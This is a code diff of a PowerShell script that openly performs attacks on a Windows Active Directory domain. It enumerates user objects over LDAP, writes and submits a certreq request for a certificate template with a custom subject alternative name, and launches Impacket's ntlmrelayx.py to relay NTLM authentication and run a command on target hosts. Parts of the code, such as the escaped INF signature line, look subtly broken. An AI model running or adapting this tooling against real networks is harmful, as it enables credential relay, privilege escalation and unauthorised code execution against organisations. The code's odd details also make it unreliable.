@@ -10,15 +10,10 @@ function Perform-LDAPQuery {
 
     try {
         # Set up the LDAP connection
-        $ldapConnection = New-Object DirectoryServices.DirectorySearcher
-        $ldapConnection.Filter = "(objectClass=*)"
-        $ldapConnection.Properties.PropertyNames
-
-        # Bind to the server
         $directoryEntry = New-Object DirectoryServices.DirectoryEntry("LDAP://$ldapServer", $ldapUsername, $ldapPassword)
-        $ldapConnection.SearchRoot = $directoryEntry
-        $ldapConnection.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure
-
+        $ldapConnection = New-Object DirectoryServices.DirectorySearcher($directoryEntry)
+        $ldapConnection.Filter = "(objectClass=user)"  # Specify more precise search filter
+       
         # Perform the LDAP query
         $results = $ldapConnection.FindAll()
 
@@ -39,9 +34,33 @@ function Request-Certificate {
     )
 
     try {
-        # Request a certificate from the CA
-        $certRequest = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509CertificateRequest
-        $cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\LocalMachine\My" -DnsName "example.com"
+        # Define the certificate request file
+        $requestFile = "C:\temp\request.inf"
+        $responseFile = "C:\temp\response.cer"
+        
+        # Create a request INF file for the certificate template
+        $infContent = @"
+[Version]
+Signature = "\$Windows NT\$"
+
+[NewRequest]
+Subject = "CN=example.com"
+KeySpec = 1
+KeyUsage = 0xA0
+MachineKeySet = TRUE
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+RequestType = PKCS10
+RequestAttributes = "CertificateTemplate:$certTemplate"
+[Extensions]
+2.5.29.17 = "{text}"
+_continue = "dns=example.com"
+"@
+        $infContent | Out-File -FilePath $requestFile
+
+        # Run certreq to submit the request to the CA server
+        $certReqCmd = "certreq -submit -config $caServer\$certTemplate $requestFile $responseFile"
+        Invoke-Expression $certReqCmd
+        
         Write-Host "Certificate requested successfully!"
     } catch {
         Write-Host "Error requesting certificate: $_"
@@ -56,9 +75,13 @@ function Perform-NTLMRelayAttack {
     )
 
     try {
-        # Start the Impacket ntlmrelayx.py tool (make sure Impacket is installed)
+        # Path to Impacket's ntlmrelayx.py script
         $impacketPath = "C:\Path\to\impacket\ntlmrelayx.py"
-        Start-Process $impacketPath -ArgumentList "-tf $targetFile -c $command"
+        $arguments = "-tf $targetFile -c $command"
+        
+        # Start the process
+        Start-Process -FilePath $impacketPath -ArgumentList $arguments
+        Write-Host "NTLM relay attack initiated."
     } catch {
         Write-Host "Error in NTLM relay attack: $_"
     }
@@ -84,4 +107,3 @@ $targetFile = "target.txt"
 $command = "whoami"
 Write-Host "Running NTLM relay attack..."
 Perform-NTLMRelayAttack -targetFile $targetFile -command $command
-
